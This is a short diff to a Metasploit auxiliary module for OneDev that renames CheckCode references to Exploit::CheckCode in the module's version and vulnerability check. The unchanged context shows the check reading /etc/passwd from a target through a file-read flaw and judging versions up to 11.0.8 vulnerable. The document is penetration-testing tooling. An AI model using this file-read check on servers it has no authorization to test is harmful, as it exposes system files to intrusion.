@@ -57,10 +57,10 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path)
     })
 
-    return CheckCode::Unknown('Request failed') unless res
+    return Exploit::CheckCode::Unknown('Request failed') unless res
 
     unless ['OneDev', "var redirect = '/~login';"].any? { |f| res.body.include? f }
-      return CheckCode::Unknown("The target isn't a OneDev instance.")
+      return Exploit::CheckCode::Unknown("The target isn't a OneDev instance.")
     end
 
     version = res.body.scan(/OneDev ([\d.]+)/).first
@@ -70,19 +70,19 @@ class MetasploitModule < Msf::Auxiliary
         res = read_file(datastore['PROJECT_NAME'], '/etc/passwd')
 
         if res.body.include? 'root:x:0:0:root:'
-          return CheckCode::Vulnerable('OneDev instance is vulnerable.')
+          return Exploit::CheckCode::Vulnerable('OneDev instance is vulnerable.')
         else
-          return CheckCode::Safe('OneDev instance is not vulnerable.')
+          return Exploit::CheckCode::Safe('OneDev instance is not vulnerable.')
         end
       end
-      return CheckCode::Unknown('Unable to detect the OneDev version, as the instance does not have anonymous access enabled.')
+      return Exploit::CheckCode::Unknown('Unable to detect the OneDev version, as the instance does not have anonymous access enabled.')
     end
 
     version = Rex::Version.new(version[0])
 
-    return CheckCode::Safe("OneDev #{version} is not vulnerable.") if version > Rex::Version.new('11.0.8')
+    return Exploit::CheckCode::Safe("OneDev #{version} is not vulnerable.") if version > Rex::Version.new('11.0.8')
 
-    CheckCode::Appears("OneDev #{version} is vulnerable.")
+    Exploit::CheckCode::Appears("OneDev #{version} is vulnerable.")
   end
 
   def validate_project_exists(project)
